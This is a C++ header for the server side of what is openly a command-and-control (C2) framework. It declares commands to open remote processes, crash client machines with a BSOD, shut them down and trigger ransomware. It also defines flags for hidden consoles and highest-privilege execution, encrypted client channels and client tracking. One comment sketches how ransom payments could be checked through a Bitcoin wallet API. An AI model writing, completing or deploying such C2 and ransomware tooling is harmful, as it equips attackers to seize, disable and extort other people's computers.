#pragma once

#include "NetworkCommon.h"
#include "Client.h"
#include "External/base64.h"
#include "External/json.hpp"
#include <thread>
#include <mutex>
#include <iostream>
#include <openssl/bio.h>
#include <openssl/rsa.h>

using JSON = nlohmann::json;

/*
	packet flag description
	for printing info about the flag
*/
struct PacketFlagInfo {
	std::string description;
	unsigned int flag;
};

/*
	possible commands to perform on the client 
	from the server
*/
const std::map<RemoteAction, std::string> ServerCommands = 
{
	{ kOpenRemoteProcess, "Open a remote process." },
	{ kPingClient,        "Send a ping to a remote host." },
	{ kRemoteBSOD,        "Cause a BSOD on the client." },
	{ kRemoteShutdown,    "Shutdown the clients machine." },
	{ kKillClient,        "Forcefully disconnect the client from the C2 server." },
	{ kRansomwareEnable,  "Run ransomware on the client." },
};

/*
	possible flags you can include in your command
	includes a short description, name as a string to check for input
	and the actual value of the flag
*/
const std::map<std::string, PacketFlagInfo> ServerCommandFlags = 
{
	{ "NO_CONSOLE",          {"Run command with no console opened.",								NO_CONSOLE} },
	{ "RUN_AS_HIGHEST",      {"Run command with highest privileges on remote host.",			    RUN_AS_HIGHEST} },
	{ "RUN_AS_NORMAL",       {"Run command with current privileges on remote host.",			    RUN_AS_NORMAL} },
	{ "USE_CLI",             {"Run command using cmd.exe.",										    USE_CLI} },
	{ "RESPOND_WITH_STATUS", {"Remote host will respond to server after the command is performed.", RESPOND_WITH_STATUS } },
	{ "PACKET_IS_A_COMMAND", {"This request is something that should be performed on the client.",  PACKET_IS_A_COMMAND} }
};

class ServerInterface
{
public:
	ServerInterface() = default;

	ServerInterface(int UDPPort, int TCPPort);
	~ServerInterface();

	BOOL		      StartServer(Server& server);
	void			  ShutdownServer(BOOL confirm);
	Server            NewServerInstance(SocketTypes serverType, int port);
	BOOL              TCPSendMessageToClient(long cuid, Packet& req);
	BOOL              TCPSendMessageToAllClients(Packet& req);
	BOOL		      SendTCPClientRSAPublicKey(long cuid, BIO* pubKey);
	BOOL			  SaveServerState(); // save the server state in a json file
	JSON			  ReadServerStateFile() noexcept;  // parse server state file as json
	Client*			  GetClientSaveFile(long cuid); // get properties of a client from the server save file
	BOOL		      IsClientInSaveFile(std::string machineGUID);
	BOOL			  SendCommandsToClients();
	void			  OutputServerCommands();
	BOOL			  IsServerCommand(long command);

	/*
		A thread that receives clientRequests from each client that connects.

		If the ExpectingResponse boolean is set to true, this means a
		server function is waiting for a response from this client.
		Cast to ClientResponse instead of a ClientRequest, otherwise
		all received data is automatically interpreted as a ClientRequest.
	*/
	void              TCPReceiveMessagesFromClient(long cuid);
	
	void		      AcceptTCPConnections();
	ClientResponse    WaitForClientResponse(long cuid);
	std::unordered_map<long, Client>& GetClientList();
	BOOL			  GetClientComputerName(long cuid);
	BOOL			  GetClientMachineGUID(long cuid);
	void              ListenForUDPMessages();
	BOOL              AddToClientList(Client client);
	ClientResponse    PingClient(long cuid);
	BOOL              ClientIsInClientList(long cuid);
	Client*           GetClientPtr(long cuid);
	inline Server     GetTCPServer()				   const { return this->m_TCPServerDetails; }
	inline Server     GetUDPServer()				   const { return this->m_UDPServerDetails; }
	const inline auto ReadConfig()					   const { return this->m_Config; };

protected:
	/*
		Not actually adding a ransomware, especially since this
		code is open-source. Though, I would approach this by using
		some sort of BTC wallet api and assigning every client a unique
		wallet address or message to send, check if that is in the wallet transaction history.

		May be implemented someday...
	*/
	inline BOOL       IsRansomPaid(Client client) { return TRUE; } // return true always. 
	BOOL			  PerformRequest(ClientRequest req, Server on, long cuid = -1, sockaddr_in incoming = NetCommon::_default);
	BOOL			  ExchangePublicKeys(long cuid);

	/*
		Wrapper for ReceiveData.
		Receive from a specific client and decrypt
		using the rsa key
	*/
	template <typename _Struct>
	_Struct           ReceiveDataFrom(SOCKET s, BOOL encrypted = FALSE, RSA* rsaKey = {});
	void			  RunUserInputOnClients();
	BOOL			  HandleUserInput(unsigned int command, Packet& outputCommand);
	void			  OnTCPConnection(SOCKET connection, sockaddr_in incoming);

private:
	/*
		A dictionary with the clientId that contains
		Information about the connected client alongside its private and public
		uniquely generated rsa key for all connected clients
	*/
	std::unordered_map<long, Client> m_ClientList;
	std::mutex    m_ClientListMutex; // concurrency
	Server        m_TCPServerDetails;
	Server        m_UDPServerDetails;
	RSAKeys		  m_SessionKeys; // RSA keys for the duration of the server session

	struct {
		std::string serverStatePath      = ".";
		std::string serverStateFilename  = "server_state.json";
		std::string serverStateFullPath  = serverStatePath + "\\" + serverStateFilename;
		std::string serverConfigPath	 = ".";
		std::string serverConfigFilename = "server_conf.json";
		std::string serverConfigFilePath = serverConfigPath + "\\" + serverConfigFilename;
		std::string domainName           = DNS_NAME; // DNS tcp server is running on, from Client.h
		const int   maxConnections       = 100; // re build to change max connections
		long        TCPPort              = -1;  // Setup alongside ServerInterface constructor
		long        UDPPort              = -1;  // Setup alongside ServerInterface constructor
	} m_Config;
};